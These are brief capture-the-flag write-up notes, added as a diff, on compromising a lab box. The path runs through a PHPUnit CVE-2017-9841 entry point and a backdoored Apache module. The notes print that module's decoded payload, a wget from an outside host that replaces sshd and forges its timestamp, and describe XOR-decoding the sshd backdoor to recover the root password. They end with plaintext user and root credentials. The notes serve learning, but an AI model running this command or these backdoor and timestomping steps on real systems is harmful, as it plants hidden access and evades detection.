@@ -1,0 +1,34 @@
+/www/vendor contained phpunit > vulnerable to CVE-2017-9841
+
+writeup referenced /www/info/ but it literally isn't there
+
+after getting user we check his email to see there is
+a problem with the apache server
+
+inside /usr/lib/apache2/modules there is a file mod_reader.so
+this file was selected because it had been modified 
+very recently as opposed to all other apache2 files which
+were factory default
+
+this file had a base64 string that translated out to:
+wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
+
+so now we know there is a file in /usr/sbin called sshd we 
+need to look at.
+
+analyzing sshd with ghidra there is an auth_password function
+with a 31 byte backdoor array. By saving these values to a c
+code file, arranging them in descending order and pushing 
+them through 3 steps in CyberChef:
+1.) Swap endianness using hex format at 31 byte size
+2.) From Hex using space delimiter
+3.) XOR 96 with standard scheme
+we can get the root password. 
+
+Note you will have to change the negative value by altering
+ghidra's character representation.
+
+ssh with it to win
+
+user steven1:ihatehackers
+root root:@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
